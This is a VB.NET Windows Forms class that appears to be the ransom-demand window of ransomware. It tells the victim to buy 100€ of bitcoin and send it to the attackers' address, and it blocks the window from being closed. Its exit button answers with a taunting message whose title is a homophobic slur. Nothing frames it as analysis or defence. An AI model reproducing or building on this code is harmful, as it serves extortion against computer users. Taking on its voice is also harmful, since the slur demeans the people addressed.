Public Class Form2
    Private Sub HelpBtn_Click(sender As Object, e As EventArgs) Handles HelpBtn.Click
        MessageBox.Show("Go to coinbase.com and make an account. Enter a valid ID and buy 100€ worth of bitcoins. After that, click send and enter the bitcoin address we provided. Also it would be better to take a screenshot of our address or note it down because this window will not reappear after a reboot.",
    " ", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub

    Private Sub ExitBtn_Click(sender As Object, e As EventArgs) Handles ExitBtn.Click
        MessageBox.Show("Yeah, good luck on that buddy",
    "Look at this faggot", MessageBoxButtons.OK, MessageBoxIcon.Stop)
    End Sub

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        e.Cancel = True
    End Sub

End Class